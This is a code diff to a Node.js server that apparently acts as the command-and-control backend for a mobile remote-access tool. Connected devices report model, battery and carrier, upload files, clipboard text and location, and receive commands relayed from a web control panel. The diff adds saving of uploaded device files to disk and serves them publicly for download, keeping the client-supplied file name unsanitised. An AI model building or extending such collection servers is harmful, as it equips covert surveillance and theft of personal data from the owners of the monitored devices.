@@ -1,5 +1,6 @@
 const express = require('express');
 const http = require('http');
+const path = require('path'); // Import the path module
 const webSocket = require('ws');
 const uuid4 = require('uuid').v4;
 const multer = require('multer');
@@ -7,28 +8,30 @@ const bodyParser = require('body-parser');
 
 const app = express();
 const server = http.createServer(app);
-
-// Initialize a single WebSocket server
 const wss = new webSocket.Server({ server });
 
+// --- File Storage Configuration ---
+// Configure multer to save files to the 'uploads' directory
+const storage = multer.diskStorage({
+    destination: './uploads/',
+    filename: function (req, file, cb) {
+        // Prepend timestamp to original filename to prevent overwrites
+        cb(null, Date.now() + '-' + file.originalname);
+    }
+});
+const upload = multer({ storage: storage });
+
 // --- Middleware Setup ---
-// Serve static files (HTML, CSS, JS) from the 'public' folder
 app.use(express.static('public'));
-// Configure multer for file uploads and body-parser for text data
-const upload = multer();
+// Create a static path for the 'uploads' folder to make files viewable
+app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 app.use(bodyParser.json());
 
 // --- In-Memory Storage ---
-// A Map to store connected device clients (key: uuid, value: device info)
 const deviceClients = new Map();
-// A Set to store all connected web panel clients
 let panelClients = new Set();
 
 // --- Helper Functions ---
-/**
- * Broadcasts a message to all connected web control panels.
- * @param {object} data The data object to be sent as a JSON string.
- */
 function broadcastToPanels(data) {
     const message = JSON.stringify(data);
     panelClients.forEach(panelWs => {
@@ -38,30 +41,36 @@ function broadcastToPanels(data) {
     });
 }
 
-// --- HTTP Routes for Data Upload from Devices ---
+// --- HTTP Routes for Data Upload ---
 
-// Serve the main control panel page
 app.get('/', (req, res) => {
     res.sendFile(__dirname + '/public/index.html');
 });
 
-// Endpoint for file uploads
+// --- ENHANCED /uploadFile Endpoint ---
+// This endpoint now saves the file and broadcasts its download path
 app.post("/uploadFile", upload.single('file'), (req, res) => {
     const { model, uuid } = req.headers;
     console.log(`Receiving file from ${model || 'unknown device'}`);
+    
+    if (!req.file) {
+        return res.status(400).send('No file uploaded.');
+    }
+
+    // Broadcast a message with the file's name and its new download path
     broadcastToPanels({
         type: 'file_received',
         payload: {
             uuid: uuid,
             deviceName: deviceClients.get(uuid)?.model || model,
             filename: req.file.originalname,
-            message: `Received file '${req.file.originalname}' from ${model}.`
+            // This path can be used directly in an <a> tag on the frontend
+            downloadPath: `/uploads/${req.file.filename}`
         }
     });
-    res.status(200).send('File upload acknowledged.');
+    res.status(200).send('File uploaded and saved successfully.');
 });
 
-// Endpoint for text uploads (e.g., clipboard)
 app.post("/uploadText", (req, res) => {
     const { model, uuid } = req.headers;
     console.log(`Receiving text from ${model || 'unknown device'}`);
@@ -76,7 +85,6 @@ app.post("/uploadText", (req, res) => {
     res.status(200).send('Text received.');
 });
 
-// Endpoint for location uploads
 app.post("/uploadLocation", (req, res) => {
     const { model, uuid } = req.headers;
     console.log(`Receiving location from ${model || 'unknown device'}`);
@@ -93,20 +101,15 @@ app.post("/uploadLocation", (req, res) => {
 });
 
 
-// --- Main WebSocket Connection Logic ---
+// --- Main WebSocket Connection Logic (No changes here) ---
 wss.on('connection', (ws, req) => {
     const connectionUrl = req.url;
 
-    // --- Handle Control Panel Connections ---
     if (connectionUrl === '/panel') {
         console.log('✅ Control Panel connected.');
         panelClients.add(ws);
-
-        // Send the current list of devices to the newly connected panel
         const deviceList = Array.from(deviceClients.values()).map(d => ({...d, ws: undefined}));
         ws.send(JSON.stringify({ type: 'initial_device_list', payload: deviceList }));
-
-        // Listen for commands from the panel
         ws.on('message', (message) => {
             try {
                 const data = JSON.parse(message);
@@ -122,32 +125,22 @@ wss.on('connection', (ws, req) => {
                 console.error('Failed to process message from panel:', error);
             }
         });
-
-        // Clean up when panel disconnects
         ws.on('close', () => {
             console.log('❌ Control Panel disconnected.');
             panelClients.delete(ws);
         });
-        return; // End execution for panel client
+        return;
     }
 
-    // --- Handle Device Connections (Default) ---
     const uuid = uuid4();
     const { model, battery, version, brightness, provider } = req.headers;
-
     const deviceInfo = { ws, uuid, model, battery, version, brightness, provider };
     deviceClients.set(uuid, deviceInfo);
-
     console.log(`📱 Device connected: ${model} | UUID: ${uuid}`);
-
-    // Notify all panels of the new device connection
     const broadcastPayload = { uuid, model, battery, version, brightness, provider };
     broadcastToPanels({ type: 'device_connected', payload: broadcastPayload });
-
-    // Handle messages received from the device
     ws.on('message', (message) => {
         console.log(`[${model}]: ${message}`);
-        // Forward device messages to panels as logs
         broadcastToPanels({
             type: 'device_log',
             payload: {
@@ -157,12 +150,9 @@ wss.on('connection', (ws, req) => {
             }
         });
     });
-
-    // Handle device disconnection
     ws.on('close', () => {
         console.log(`🔌 Device disconnected: ${model} | UUID: ${uuid}`);
         deviceClients.delete(uuid);
-        // Notify all panels of the disconnection
         broadcastToPanels({ type: 'device_disconnected', payload: { uuid } });
     });
 });
